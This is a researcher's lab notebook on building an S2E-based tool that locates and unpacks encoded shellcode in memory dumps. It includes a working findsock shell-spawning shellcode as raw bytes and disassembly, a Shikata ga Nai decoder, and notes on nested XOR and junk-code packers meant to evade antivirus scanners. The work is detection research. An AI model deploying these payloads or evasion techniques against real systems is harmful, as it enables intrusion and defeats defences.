>>      4   4B @0xbfa08f97: d9 74 24 f4       fnstenv [esp-0xc]       
>>      5   1B @0xbfa08f9b: 5b                pop ebx                 
>>      6   2B @0xbfa08f9c: 29 c9             sub ecx, ecx            
>>      7   2B @0xbfa08f9e: b1  b             mov cl, 0xb             
>>      8   3B @0xbfa08fa0: 83 c3  4          add ebx, 0x4            
>>      9   3B @0xbfa08fa3: 31 43 14          xor [ebx+0x14], eax     
>>     10   3B @0xbfa08fa6:  3 43 86          add eax, [ebx-0x7a]     
>>     11   1B @0xbfa08fa9: 58                pop eax                 
>>     12   2B @0xbfa08faa: eb b7             jmp 0xffffffffffffffb9  
>> Printing the memory map (1 snapshots)
>>    Printing snapshot 0
>>    The density (0 to 1) of this state's path is (28/28) = 1
>>    Mem_map start_addr: 0xbfa08f90, length: 68B, exec'ed bytes: 28, range: 28B, end_addr: 0xbfa08fab
           0 1 2 3  4 5 6 7  8 9 a b  c d e f   ASCII
0xbfa08f90 dad4b892 ba1e5cd9 7424f45b 29c9b10b  ......\.t$.[)...
0xbfa08fa0 83c30431 43140343 8658ebb7           ...1C..C.X..    
21 [State 0] Terminating state 0 with message 'eliminated a state that exec'ed out of module bounds'
All states were terminated

Make a simple packer? http://www.inf.fu-berlin.de/lehre/SS11/compsec/stack_builder.c



1) double check UPX
[s2e@s2e:~/s2e/dasos/ByteArrays]$ ./upx upx1-in.rawshell --best                       Ultimate Packer for eXecutables
                          Copyright (C) 1996 - 2011
UPX 3.08        Markus Oberhumer, Laszlo Molnar & John Reiser   Dec 12th 2011

        File size         Ratio      Format      Name
   --------------------   ------   -----------   -----------
upx: upx1-in.rawshell: EOFException: premature end of file

Packed 0 files.

[s2e@s2e:~/s2e/dasos/ByteArrays]$ ./upx upx1-in.rawshell --best --force-execve                       Ultimate Packer for eXecutables
                          Copyright (C) 1996 - 2011
UPX 3.08        Markus Oberhumer, Laszlo Molnar & John Reiser   Dec 12th 2011

        File size         Ratio      Format      Name
   --------------------   ------   -----------   -----------
upx: upx1-in.rawshell: UnknownExecutableFormatException

Packed 0 files.

According to this man page UPX does not support raw byute code: http://manpages.ubuntu.com/manpages/hardy/man1/upx-ucl.1.html
UPX is used to distort signatures of binaries that are transfered to remote systems, it does not interact on the exploit/shellcode level.

-Tried actual ghttpd.dump and it misses true start (claims an that true start is an OOB jmp). Note that it catches a subset of it true shellcode.s. 

-Investigated why ghttpd.dump isn't properly detected. Changed it to output traces whenever OOB happens. There is an illegal insn D9, doesn't know how to handle, what is the original ASM for the shellcode?

-find a simpler msfencode
-gdb execution of msfencoded dump (use make debug)

-reading list



------------------------------Meeting notes 6 Nov 2012
Get rid of "infinite loop detection," the coding is flawed as it would report any forloop that iterates more than 3 times as an "infinite" loop.
Instead do a inRangeInsnsCnt (the number of instructions that occur within the buffer boundaries from a time that it enters the range until it leaves, ie it set to 0 when it leaves boundary) and outOfRangeInsnsCnt (the number of instructions that occur out of buffer boundaries from the time it leaves until it returns, ie it is set to 0 when it reenters boundary).
We can then set a threshold of exec'ed OOB insns MAX_OUT_OF_RANGE, something large, say 1,000,000. Do not record value of bytes exec'ed during this, but record the addr/len. Perhaps try to print out symbol table to determine what is being called.

One trick to use with printing out where in memory it is, userspace is 0 .. TASK_SIZE, which is defined in include/asm/processor.h. The symb table is in /proc/PID/maps.

Add a condition that if the syscall number is 1 (exit) then it is a success


------------------------------Work since 6 Nov 2012
Ok where am I? need to get a packer go to show that the system works with polymorphism. What is the quickest way to do that?
Run through all the QA...
 1) ./shellcode-wrapper -p -x                          # test default
 2) ./shellcode-wrapper -i hw.rawshell -e 16 -x        # test inputting a rawshell (with eip)
 3) ./shellcode-wrapper -i hw.rawshell -x              # test inputting a rawshell (without eip/syscall)
 4) ./shellcode-wrapper -i hw.dump -f 496 -c 22 -x     # test inputting a dump (with eip/syscall)
 5) ./shellcode-wrapper -i hw2.dump -f 496 -c 40 -x    # test inputting a dump (without eip/syscall)
 6) ./shellcode-wrapper -i hw2.dump -x                 # test inputting a dump (without eip/syscall) and no offset/cases   <-----
 7) ./shellcode-wrapper -i hw4.dump -x                 # test inputting a dump (with eip/syscall) with rand fill
 8) ./shellcode-wrapper -i hw5.dump -x                 # test inputting a dump (without eip/syscall) with rand fill
 9) ./shellcode-wrapper -i ghttpd.dump -x -f 465 -c 20 # test actual dump input
10) ./shellcode-wrapper -n                          # test normalizing the default
11) ./shellcode-wrapper -i msfe-out-sganai.rawshell -n


Got stuck for a while ferretting out why preceding nulls were interpreted as different between runs. The core of the problem is that 0xc* addrs show up within code when no calls were made, 0 0 is add [eax], al or write reg a to the memory address of 0x<value of reg a>. This *might* be causing a segfault. Upon a new instruction it is used to look at the previous "valid" insn. If the current invalidates the previous, then the prev is scrubbed from use in future computation (the byte values in the snapshot are kept, but the s.min_addr is changed, NOTE that s.max_addr code is not complete but not needed right now; also the trace notes that insn as invalid. Thsi repeats for each new insn.

Thus for two things: isTraceSubset and printTrace/printSnapshot, the valid bool it also checked. For isTraceSubset only valid bytes are compared. And for printTrace invalid insns are noted. And for printSnapshot, the invalid bytes are not printed to screen.

I also caught an error where onTranslateInsnEnd the PID wasn't being checked, this eliminated a number of interruptions. Still need to figure out why there are other OOB jumps.


------------------------------Meeting notes 4 Dec 2012
Add a list of black listed, impossible, first insns, like '0 0'.
Investigate is the getPID reports the pid even if in kernel mode, and if so eliminate kernel mode.


------------------------------Work since 4 Dec 2012
 7) ./shellcode-wrapper -i hw4.dump -x                 # test inputting a dump (with eip/syscall) with rand fill <----
 8) ./shellcode-wrapper -i hw5.dump -x                 # test inputting a dump (without eip/syscall) with rand fill
 9) ./shellcode-wrapper -i ghttpd.dump -x -f 465 -c 20 # test actual dump input
10) ./shellcode-wrapper -n                             # test normalizing the default
11) ./shellcode-wrapper -i msfe-out-sganai.rawshell -n # test packer input

Look at debug.txt and see if pass trial #7
Do meeting note goals by Thursday. General goal is to eliminate the OOB if there aren't any jumps etc.

When running #7 execution dies on offset 70 (state 71). Pertinent log:
85 [State 71] Leaving buffer range @0xc126f4b4, 6 IoB insns; prev insn @0xbf8dc382
  1   2B @0xbf8dc382: 70 e1             jo 0xffffffffffffffe3  
Then it has 20,000+ Firing timer event, ie 6hrs of runtime before dieing of unknown causes
I reran things, within a minute it reaches 20,000+ OOB instructions, here are the final insns before it freezes
20778   2B @0xc1024e2b: 74 52             jz 0x54                 
20779  11B @0xc1024e2d: 64 c7  5 e4 d0 41 c1  1  0  0  0 mov dword [fs:0xc141d0e4], 0x1
20780   7B @0xc1024e38: 64 89 15 e0 d0 41 c1 mov [fs:0xc141d0e0], edx
20781   6B @0xc1024e3f: 8d 82 58  1  0  0 lea eax, [edx+0x158]    
20782   8B @0xc1024e45: 3e  f ab b2 58  1  0  0 bts [ds:edx+0x158], esi 
20783   3B @0xc1024e4d: 8b 42 24          mov eax, [edx+0x24]     
20784   5B @0xc1024e50:  5  0  0  0 40    add eax, 0x40000000     
20785   3B @0xc1024e55:  f 22 d8          mov cr3, eax   
That last insn clears the TLB. There were many other, what clearly appear to be, full functions (with proper stack frame restoration and rets).

I discovered that S2E's get PID fn (the one that I had been using) works by returning the top 20b of CR3. This explains why we were having out of bounds code appear.
Apparently, from what I've read, Linux kernel mode doesn't need to change CR3. Every process has the kernel mappings, so the kernel uses whatever value is in CR3 until it needs to be changed, if at all.
Looking into it further, I think I found a easy quick solution. Nearly all the OOB addresses that I've seen are >= 0xc1000000. As it turns out according to http://www.tldp.org/HOWTO/KernelAnalysis-HOWTO-7.html kernel space is mapped to 2 segments (code and data/stack) from [0xC000 0000] (3 GB) to [0xFFFF FFFF] (4 GB).
Assuming that (and I think that you agreed yesterday) we should ignore kernel code---as any state that would have it, would also make a syscall or sysenter, which we intercept already.
My proposal is that we ignore instructions with addresses >= 0xc0000000. Is this an acceptable assumption?

Re: rand fill hang on offset 70: best guess is that this is due to non proc code (possibly kernel) or signal handlers or hardware interrupts. 

I added code to count kernel insns, but there is a flaw in the logic or another non-kernel proc is running. 

Where to pick up: Unify the OOB insns exceptions. This took a whole day, the logic was very tricky and new features were added: knowledge of a tot_killable_insns, which if the program runs wnough of, then it kills the proc. This is a combination of other procs, the kernel, and oob instructions. I tried 1000000, but it took a few minutes to reach 30000, so I set it to 10000. Each of the subcategories can be reset, but total keeps counting until a legit insn runs. I could make this about 100,000, but we'll see. Also it may be worth taking other procs out of the count.


There appears to be an issue with labels used in jmps and loops. Perhaps the distances aren't being read properly by the 64b VMM?
Also how is the f4 hlt cmd handled? apparently it should cause a segfault if not in ring0


73 [State 19] Message from guest (0xbfd8057c): << About to call dasospreproc_init with shell: 0xbfd80f20 (offset of 480 not yet applied), shell_len: 1024, eip: 0xbfd81120

>> Recv'ed custom insn for a DasosPreproc memory segment within pid 86716416, addr range: 0xbfd80f20-0xbfd81320 with eip: 0xbfd81120 buffer length: 1024 and syscall number: 102
73 [State 19] @0x080495c3, left buffer range after 17 IoB insns; last IoB insn @0xbfd8111e, disasm in debug.
  1  2B @0xbfd8111e: cd 80             int 0x80    

How was an int 80 issued by the system call detector not turned on?

extended the signal handler

Excellent discussion on registers: http://www.eecg.toronto.edu/~amza/www.mindsec.com/files/x86regs.html also see http://www.cs.virginia.edu/~evans/cs216/guides/x86.html#registers

Where to pick up: look at debug.txt of ./shellcode-wrapper -i ghttpd.dump -x -f 462 -c 89 # test actual dump input from within nop sled to 1B after last syscall


Notes on some shellcode:
(from http://www.phrack.org/issues.html?id=7&issue=62)
Jmp/Call: To get EIP (to use as a relative base address), we can use a CALL and a POP instruction. Upon a call, the return value is pushed onto the stack. So, if the first thing we do in the function is a POP command, we can store the return value in a register. As shown below, EAX will be 451005.
450000:     
      label1:  pop eax
450005:     ... (eax = 451005)

451000:     call label1    ;start here!
451005:

Most likely you will find something similar to the code below in a 
shellcode, which does about the same thing.

450000:        jmp label1
450002:  
      label2:  jmp cont
450004:  
      label1:  call label2  
450009:  
      cont:       pop eax
            ...   (eax = 450009)

Another interesting mechanism being use to obtain the EIP is to make use of a few special FPU instructions.
   d9 ee          fldz             ; pushes 0.0 onto FPU stack
   ; FPU updates an element of the FpuSaveState struct named fpu_instruction_pointer to this insn address
   d9 74 24 f4    fnstenv [esp-12] ; stores FpuSaveState struct onto stack at [esp-0xc]
   ; this offset puts the fpu_instruction_pointer element at [esp]
   5b             pop ebx          ; loads ebx with the fpu_instruction_pointer value
   ; ebx now contains a value that points to the location of the fldz insn, can be used as a base register to access nearby with relative addresses

For a decently small code obfuscator check out: https://www.symantec.com/avcenter/reference/evolving.shell.code.pdf

                   
  3  1B @0xbf9c1c61: 90                    nop                     
                                                                             ; zero out ecx
  4  2B @0xbf9c1c62: 29 c9                 sub ecx, ecx                      ; ecx = value - value = 0   
                                                                             ; set the counter to 16
  5  3B @0xbf9c1c64: 83 e9 f0              sub ecx, 0xf0                     ; ecx = ecx - 0xf0 = 0 - -16 = 16 (signed 0b11110000 = -128 + 0b01110000 (112) = -16)
                                                                             ; do a FPU insn, prompt record keeping
  7  2B @0xbf9c1c67:*d9 ee                 fldz                              ; set FPU's record of EIP to this insn 0xbf9c1c67
                                                                             ; get the FPU's record
  8  4B @0xbf9c1c69: d9 74 24 f4           fnstenv [esp-0xc]                 ; write FPU's struct of records to [esp-0xc], which puts the fldz PC value at [esp]
                                                                             ; get the addr for relative addressing
  9  1B @0xbf9c1c6d: 5b                    pop ebx                           ; ebx = 0xbf9c1c67
                                       ; label LOOP:
                                                                             ; treat the 4B at ebx+0x13 as a pointer, eg int * a; a = (int *)(ebx+0x13);
                                                                             ; 0xbf9c1c67 + 0x13 = 0xbf9c1c7a
 10  7B @0xbf9c1c6e: 81 73 13 49 d4 d6 21  xor dword [ebx+0x13], 0x21d6d449  ; a[0] = a[0] ^ 0x49d4d621
                                                                             ; 0xbf9c1c67 - 0xfc = 0xbf9c1c6b (0xfc = 252; signed 0b11111100 = -128 + 0b01111100 (124) = -4)
 11  3B @0xbf9c1c75: 83 eb fc              sub ebx, 0xfc                     ; ebx = ebx - -4 = ebx + 4;   
                                                                             ; loop LOOP
                                                                             ; ecx = ecx - 1; 
                                                                             ; if (ecx != 0) jmp 0xf4 (0xf4 = unsigned 244 = signed 0b11110100 = -128 + 0b01110100 (116) = -12) and 0xbf9c1c78 + 2 (length of insn) - 12 = 0xbf9c1c6e;)  
 12  2B @0xbf9c1c78: e2 f4                 loop 0xf4                         ; else /* ecx == 0 */ continue to 0x...x7a
                                                                             ; 




Added exec-all.h:224 (S2EEditedSources/qemu-exec-all.h) within struct TranslationBlock: 
    uint64_t pcOfNextInstr; /* RJF, allows translate.c to report the next PC it plans to execute */
Added i386-translate.c:8174 (S2EEditedSources/i386-translate.c) within gen_intermediate_code_internal, the fn that calls disas_insn:
#ifdef CONFIG_S2E
        tb->pcOfNextInstr = pc_ptr; // RJF
#endif
That didn't work, instead did within i386-translate.c:gen_instr_end(DisasContext *s)
   s->tb->pcOfNextInstr = s->useNextPc ? s->nextPc : (uint64_t)-1; // RJF


this only gets sequential nextPCs, need to catch when jmps, etc modify things.



------------------------------14 Feb 2013
Summary of previous work gap in notes:
-Did huge code base revamp and QA on it.
-The primary error worth debugging is faulty handling of loops as seen in ghttpd dump.
-Did Comp Exam/Reading List Dec 3 pushed to Dec 24 pushed to Jan 3.
-Did PhD Diss Proposal Presentation Jan 28.

Directionary notes from proposal preparation:
-Dr. Chen wants Malware classification/genome
likelihood of code existing as relation to EIP



This log file got sporadic in a rush for development. I have created obfuscated shellcode and successfully ran it on our system.
Ideas compiled from a few places, such as:
http://www.safemode.org/files/zillion/shellcode/doc/Writing_shellcode.html
http://funoverip.net/2011/09/simple-shellcode-obfuscation/

We have two tools under the directory ObfuscationTesting:
1) junkcodeInsertion.pl which given a shellcode will insert junk bytes between every byte
2) xorencode.pl which given a shellcode and a key will encode the bytes

Both function the same way, a jmp to a call establishes the address to start decoding at as well as the place to call once decoded. The call returns back into the body of the decoder which contains a loop. The loop is stopped by a count or canary and when complete the shellcode executes as it normally would.

To look at the output use ndisasm -b 32 X.rawshell, or hexdump X.rawshell (but beware that the endianness is different). You can then look at it with shellcode-wrapper-concrete -i X.rawshell -p [-x]. Once it executes locally, you can make an entry in firstRan.sh for it and then do a make run. The results are in s2e-last/debug.txt, and save-worthy results are put into SavedOutputs/descriptor.txt.


The loop jmp detector is flawed, fix that and get the ghttpd sample running.



------------------------------Meeting notes 14 Feb 2013
I was able to run xor(xor()) an xor(junk()).

I looked further at ghttpd. It is an xor decoder loop, so I make a xordecoder given an offset and the result is a text book findsock shellcode.

[s2e@s2e:~/s2e/dasos/ObfuscationTesting]$ ndisasm -u findsock-deobs.rawshell
00000000  31D2              xor edx,edx
00000002  52                push edx
00000003  89E5              mov ebp,esp
00000005  6A07              push byte +0x7
00000007  5B                pop ebx
00000008  6A10              push byte +0x10
0000000A  54                push esp
0000000B  55                push ebp
0000000C  52                push edx
0000000D  89E1              mov ecx,esp
0000000F  FF01              inc dword [ecx]
00000011  6A66              push byte +0x66
00000013  58                pop eax
00000014  CD80              int 0x80
00000016  66817D028FFF      cmp word [ebp+0x2],0xff8f
0000001C  75F1              jnz 0xf
0000001E  5B                pop ebx
0000001F  6A02              push byte +0x2
00000021  59                pop ecx
00000022  B03F              mov al,0x3f
00000024  CD80              int 0x80
00000026  49                dec ecx
00000027  79F9              jns 0x22
00000029  52                push edx
0000002A  682F2F7368        push dword 0x68732f2f
0000002F  682F62696E        push dword 0x6e69622f
00000034  89E3              mov ebx,esp
00000036  52                push edx
00000037  53                push ebx
00000038  89E1              mov ecx,esp
0000003A  B00B              mov al,0xb
0000003C  CD80              int 0x80
0000003E  0000              add [eax],al

Why weren't these bytes in the memory capture?!

"\x31\xd2\x52\x89\xe5\x6a\x07\x5b\x6a\x10\x54\x55\x52\x89\xe1"
"\xff\x01\x6a\x66\x58\xcd\x80\x66\x81\x7d\x02\x8f\xff\x75\xf1"
"\x5b\x6a\x02\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x52\x68\x2f\x2f"
"\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xb0\x0b"
"\xcd\x80\x00\x00";

They are:
0xbfffb4a0 90909090 90909090 90909090 90909090 ................
0xbfffb4b0 90909090 90909090 90909090 90909090 ................
0xbfffb4c0 90909090 90909090 90909090 90909090 ................
0xbfffb4d0 90909090 90909090 90909090 90909090 ................
0xbfffb4e0 90909090 29c983e9 f0d9eed9 7424f45b ....).......t$.[
0xbfffb4f0 81731349 d4d62183 ebfce2f4 31d25289 .s.I..!.....1.R.
0xbfffb500 e56a075b 6a105455 5289e1ff 016a6658 .j.[j.TUR....jfX
0xbfffb510 cd806681 7d028fff 75f15b6a 0259b03f ..f.}...u.[j.Y.?
0xbfffb520 cd804979 f952682f 2f736868 2f62696e ..Iy.Rh//shh/bin
0xbfffb530 89e35253 89e1b00b cd800000 90909090 ..RS............

Note that 4fc matches the de-obfuscated shellcode. If we execute earlier than 4fc, then the code gets re-xored (ie re-encoded). 4fc - 310 = 1ec = 492. Actually make that 490 bc I missed the two bytes... 

It is a success:
>>    Printing success 1
>> Success from offset 490
>> Success densities, overlay: 1; avg: 1
>> Success eip: 0xbfd103e0 offset from base: 512
>> Printing PC Trace (instructions in order of execution)
>>      1  2B @0xbfd103ca: 31 d2                              xor edx, edx             nextPC: 0xbfd103cc
>>      2  1B @0xbfd103cc: 52                                 push edx                 nextPC: 0xbfd103cd
>>      3  2B @0xbfd103cd: 89 e5                              mov ebp, esp             nextPC: 0xbfd103cf
>>      4  2B @0xbfd103cf: 6a 07                              push 0x7                 nextPC: 0xbfd103d1
>>      5  1B @0xbfd103d1: 5b                                 pop ebx                  nextPC: 0xbfd103d2
>>      6  2B @0xbfd103d2: 6a 10                              push 0x10                nextPC: 0xbfd103d4
>>      7  1B @0xbfd103d4: 54                                 push esp                 nextPC: 0xbfd103d5
>>      8  1B @0xbfd103d5: 55                                 push ebp                 nextPC: 0xbfd103d6
>>      9  1B @0xbfd103d6: 52                                 push edx                 nextPC: 0xbfd103d7
>>     10  2B @0xbfd103d7: 89 e1                              mov ecx, esp             nextPC: 0xbfd103d9
>>     11  2B @0xbfd103d9: ff 01                              inc dword [ecx]          nextPC: 0xbfd103db
>>     12  2B @0xbfd103db: 6a 66                              push 0x66                nextPC: 0xbfd103dd
>>     13  1B @0xbfd103dd: 58                                 pop eax                  nextPC: 0xbfd103de
>>     14  2B @0xbfd103de: cd 80                              int 0x80                 nextPC: 0xbfd103e0
>> Printing the memory map (1 snapshots)
>>    Printing snapshot 0
>>    The density (0 to 1) of this state's path is (22/22) = 1
>>    Mem_map start_addr: 0xbfd103ca, length: 1024B, valid bytes: 22, exec'ed bytes: 22, range: 22B, end_addr: 0xbfd103df
           0 1 2 3  4 5 6 7  8 9 a b  c d e f   ASCII
0xbfd103c0                       31d2 5289e56a            1.R..j
0xbfd103d0 075b6a10 54555289 e1ff016a 6658cd80  .[j.TUR....jfX..

>>    Done printing success 1
>> Done printing successes
>> The success/offset with the highest overlay density is 1, value of 1
>> The success/offset with the highest average density is 1, value of 1
>> There were 1 different eips: 0xbfd103e0 

Now I need to think about what this means for detecting the true offset when the code has already been decoded and the decoder would reobfuscate...


------------------------------Meeting notes 20 Feb 2013
Once we resolve SGaNai, then we can close the finding the start of code problem.
We should also try a truly self-modifying scode.
Perhaps also one that has a key in mem to demonstrate live capture.
There is a small bug when storing loops in the trace, they print out twice instead of either once or per loop.
Need to implement copy on write link list { addr, len, orig value array, insn addr that wrote, insn seq num that wrote }
When a byte that has been written is exec'ed then make a new snapshot
Dump this data to file so we can parse it to make a replay capability.

------------------------------Work since 20 Feb 2013
The Shikata ga Nai encoder[9], included with the Metasploit Framework, implements polymorphic XOR additive feedback encoding against a four byte key.

[s2e@s2e:~/s2e/dasos/ByteArrays]$ ndisasm -u msfe-out-sganai.rawshell
00000000  DAD4              fcmovbe st4          ; make a fpu insn
00000002  B892BA1E5C        mov eax,0x5c1eba92   ; eax = 92ba1e5c (initial key)
00000007  D97424F4          fnstenv [esp-0xc]    ; write fpu records to put 00000000 at esp
0000000B  5B                pop ebx              ; ebx = 00000000
0000000C  29C9              sub ecx,ecx          ; clear ecx
0000000E  B10B              mov cl,0xb           ; ecx = 11
                        ; loop decode 11 times
00000010  83C304            add ebx,byte +0x4    ; ebx = 00000004
00000013  314314            xor [ebx+0x14],eax   ; [0x00000018] = [0x00000018] ^ eax
00000016  034314            add eax,[ebx+0x14]   ; eax = eax + [0x00000018] 
00000019  e2f5              loop ->0x10          ; ecx = 10
0000001b  eb

//https://onlinedisassembler.com/odaweb/run_hex
keyN = 0x92ba1e5c;
decode_loc = 0x14;
for (i = 0; i < 11; i++) {
   decode_loc += 4;
   word_encoded = makeWordFromByteArray (decode_loc); // starting at byte_array[decode_loc], grab 4B, return as an uint32_t
   word_decoded = word_encoded ^ keyN;
   storeWordIntoByteArray (decode_loc, word_decoded); // starting at byte_array[decode_loc], write the 4B given in word_decoded
   keyN = keyN + word_decoded;
}
// referencing a 8b array by the nth 8b as a 32b word = ((uint32_t*) &(byte_array[decode_loc]) )[0];

00000010  83C304            add ebx,byte +0x4    ; ebx = 00000008
00000013  314314            xor [ebx+0x14],eax   ; [0x0000001c] = [0x0000001c] ^ eax
00000016  034314            add eax,[ebx+0x14]   ; eax = eax + [0x0000001c]
00000019  e2f5              loop ->0x10          ; ecx = 9
0000001b  eb

// first disasm difference
00000016  034386            add eax,[ebx-0x7a]   ; 
00000019  58                pop eax
0000001A  EBB7              jmp short 0xffffffd3
0000001C  B5C5              mov ch,0xc5
0000001E  258809F174        and eax,0x74f10988
00000023  D32A              shr dword [edx],cl
00000025  CB                retf
00000026  A4                movsb
00000027  51                push ecx
00000028  A3E6C926BA        mov [0xba26c9e6],eax
0000002D  B304              mov bl,0x4
0000002F  C6                db 0xc6
00000030  54                push esp
00000031  AB                stosd
00000032  68385B64F2        push dword 0xf2645b38
00000037  AB                stosd
00000038  CF                iretd
00000039  1AD0              sbb dl,al
0000003B  13788A            adc edi,[eax-0x76]
0000003E  5A                pop edx
0000003F  38E2              cmp dl,ah
00000041  7591              jnz 0xffffffd4
00000043  CD                db 0xcd

[s2e@s2e:~/s2e/dasos/ByteArrays]$ ./PrintShell.sh msfe-out-sganai.rawshell -d 0,200 -x
!! Warning: disasm range is out of shellcode range, setting to maximum: 68
<< Requesting disasm out
<< From raw input

                                                                             ; do a FPU insn, prompt record keeping
  7  2B @0xbf9c1c67:*d9 ee                 fldz                              ; set FPU's record of EIP to this insn 0xbf9c1c67
                                                                             ; get the FPU's record
  8  4B @0xbf9c1c69: d9 74 24 f4           fnstenv [esp-0xc]                 ; write FPU's struct of records to [esp-0xc], which puts the fldz PC value at [esp]
                                                                             ; get the addr for relative addressing
  9  1B @0xbf9c1c6d: 5b                    pop ebx                           ; ebx = 0xbf9c1c67
                                       ; label LOOP:

dad4             fcmovbe st0, st4        ; make a fpu insn
b892ba1e5c       mov eax, 0x5c1eba92     ; x = 0x5c1eba92
d97424f4         fnstenv [esp-0xc]       ; write fpu records to put 
5b               pop ebx                 
29c9             sub ecx, ecx            
b10b             mov cl, 0xb             
83c304           add ebx, 0x4            
314314           xor [ebx+0x14], eax     
034386           add eax, [ebx-0x7a]     
58               pop eax                 
ebb7             jmp 0xffffffffffffffd3  ; jmp short 0xffffffd3
b5c5             mov ch, 0xc5            
258809f174       and eax, 0x74f10988     
d32a             shr dword [edx], cl     
cb               retf                    
a4               movsb                   
51               push ecx                
a3e6c926ba       mov [0xba26c9e6], eax   
b304             mov bl, 0x4             
c654             invalid                 ; C6 db 0xc6; 54 push esp;
ab               stosd                   
68385b64f2       push dword 0xf2645b38   
ab               stosd                   
cf               iretd                   
1ad0             sbb dl, al              
13788a           adc edi, [eax-0x76]     
5a               pop edx                 
38e2             cmp dl, ah              
7591             jnz 0xffffffffffffffd4  
cd               invalid                 ;  CD db 0xcd



--Start From Wang:-------------------
To get the intermediate, partially decoded result, we need to record the changes in memory. Previously proposed snapshot only happens when we see such self-modifying code that executes some instruction from the some address from where we have already executed a different instruction.

The XOR, junk code encoding (including the one used in ghttpd exploit) has separate memory range for decoder and the encoded/decode code. Therefore, the decoding does not trigger the snapshot we previously designed.

To handle such (simpler) self-modifying code, we can record the following info for each memory update within the buffer range at run-time:
1) the address and the size of the memory to be updated;
2) the current (to be updated) value of the memory;
3) the seq# and address of the instruction that will update the memory

Since memory updates within the same round of decoding tend to be clustered (both in time and space) to each other,  we can cluster the updated memory bytes into groups according to the following heuristics at offline:

cluster the memory updates instructions into rounds based on the seq#. We need to find a distance threshold, say 5 or 10 that will separate those instructions into clusters.

for each cluster of instructions, which correspondins to one rounds of decoding, we combine adjacent memory bytes into memory ranges.

for each round of decoding, we combine the memory ranges with those that have not changed. This will give us the complete snapshot of that round of decoding. We output this and point out which part has changed from what to what.
--End From Wang:-------------------

25 Feb: made DasosPreproc-10.cpp/h

Plan is to make a new mem_map for datas

Made a trace, unified insn_instance and data_instance as a typedef from event_instance. Used mem_map as is for data_map.

Found a CoreEvent onDataAccess that reports memory range, isWrite, isIO, writer's address, etc. 

Debug why there isn't an initialized data_map. PrintSuccess is stating that there isn't 1 to add the diffs to.




------------------------------Meeting notes 27 Feb 2013
Notation for below:
shellcode, s
junkcodeInsertion packer, junk(s)
xor packer, xor(s,key)
ranged xor packer, xor(s,key,offset,len)
shikata-ga-nai is written in my notes as sganai.

To review/verify our phone conversation here is the task list I compiled:
Add clustering (new snapshots made) by seqnums (get seqnum refined/debugged)
Redo a sanity check of sganai on S2E without instrumentation (disable my jump target asserts)
Demonstrate clustering, run system on output of xor(xor(xor(junk(s),key1,10,10),key1,30,10),key2,5,10)

A note on realistic examples for our future paper:
If we can't get sganai resolved, then we can demonstrate effectiveness with a packer that uses: self mutating key (eg every loop the key value goes up by 1); and, the encoding function overlaps (eg first xor does bytes 0-3 second does bytes 1-4 third 2-5, etc, instead of 1st 0-3, 2nd 4-7, 3rd 8-11, etc).
Most detection mechanisms search for the unpacking code. It is the weakest link and marginalizes the effectiveness of nested packing, e.g xor(xor(xor(junk(s)))) which outputs [de-xor1][xor1( [de-xor2][xor2( [de-xor3][xor3( [de-junk][junk(s)] )] )] )]  because all you need to detect is de-xor1. 
The state of the art from what I have seen is using code transformation (substitution, rearrangement  etc, like sganai), to avoid signature detection on the unpacker (eg de-xor1), plus at least one sandbox detection abort routine. The accepted litmus test is showing that whatever you use is undetectable by virustotal (an online malware scanner that compares 42 different antivirus programs on a given input). 


My understanding of seqnums: cluster happens between writes that are within 5 (or 10) insns/seqnums of eachother. eg #3,5,7 are on one snapshot and 13,15,17 in another, regardless if 13,15,17 don't overwrite what 3,5,7 wrote. Seqnum is globally monotonically increasing (ie dynamic) (addr x can have multiple seqnums, eg 13,15,17).

If necessary manually follow sganai try to determine if it truly is modifying intrablock insns.

Once we start to demonstrate on nesting packers a more efficient/realistic design, may be multiple range xor packer, xor(s,key1,offset1,len1,key2,offset2,len2,...); note that this differs from nesting ranged xor packers, which would output a byte array roughly in the form of [de-xor(key1,offset1,len1][xor([de-xor(key2,offset2,len2][xor([de-xor(key3,offset3,len3][xor(s,key3,offset3,len3)],key2,offset2,len2)],key1,offset1,len1)], and instead would output [de-xor(key1,offset1,len1,key2,offset2,len2,key3,offset3,len3)][xor(s,key1,offset1,len1,key2,offset2,len2,key3,offset3,len3)]. In otherwords only 1 unpacker instead of three nested unpackers.

------------------------
Todo:
-Devel clustering (new snapshots made) when seqnums between writes > 5 (or 10 insns). eg #3,5,7 are on one snapshot and 13,15,17 in another, regardless if 13,15,17 don't overwrite what 3,5,7 wrote. Seqnum is globally monotonically increasing (ie dynamic) (addr x can have multiple seqnums, eg 13,15,17)
-Get seqnum refined/debugged (why isn't it increasing properly, am I missing an onExecuteInstruction hook, vs the onTranslateInsnEnd hook currently used?)
-Redo a sanity check of S2E without instrumentation, showing that it can run sganai shellcode! (Disable my jump target asserts)
-Manually follow sganai try to determine if it is modifying intrablock insns.
-Design tests with shellcode, s, that is packed by a combination of junkcodeInsertion, junk(s), and xor, xor(keyN,s), or a ranged xor, xor(keyN,offset,len,s): test one (ie nested unpackers), xor(key2,5,10,xor(key1,30,10,xor(key1,10,10,junk(s)))); and if time, a test two (ie minimized/unnested unpackers), make a new xor that handles multiple ranges, xor(s,key1,offset1,len1,key2,offset2,len2,...): xor(key1,junk(s),key1,10,10,key2,30,10,key3,5,10))

Staying on top of documentation:
-To review, I have saved outputs of succesful runs for: xor(key1,s); junk(s); xor(key1,xor(key1,s)); xor(key1,junk(s)). For posterity I should add xor(key2,xor(key1,s)).
-Make a small write up on how exactly S2E works (intermediate rep, TCG, qemu, etc).
-Give short alrgorithmic overview of data trace method.

Notes:
-Goal to submit a paper in 2 months, which means finish devel (be able to monitor sganai) within 1 month.
-I may only get alerts of writes at the end of a block bc of performance considerations. But bc the signal also includes the value that was written, this doesn't matter (I will be able to track all writes, incl writes of diff value to same addr/size within same block.)


------------------------------Work since 27 Feb 2013
For sanity check of seeing if sganai runs without killing on bad jump detection I disabled the terminateStateEarly and cleaned up the bool settings to allow the state to continue. When disabled the execution still dies (seg fault, but after going into lib code 0x80...) so I re-enabled the jump assert.

Todo: 
1) Create ranged xor, xor(keyN,offset,len,s) and generate scode = xor(key2,5,10,xor(key1,30,10,xor(key1,10,10,junk(s))))
2) Get seqnum refined/debugged (why isn't it increasing properly, am I missing an onExecuteInstruction hook, vs the onTranslateInsnEnd hook currently used?)
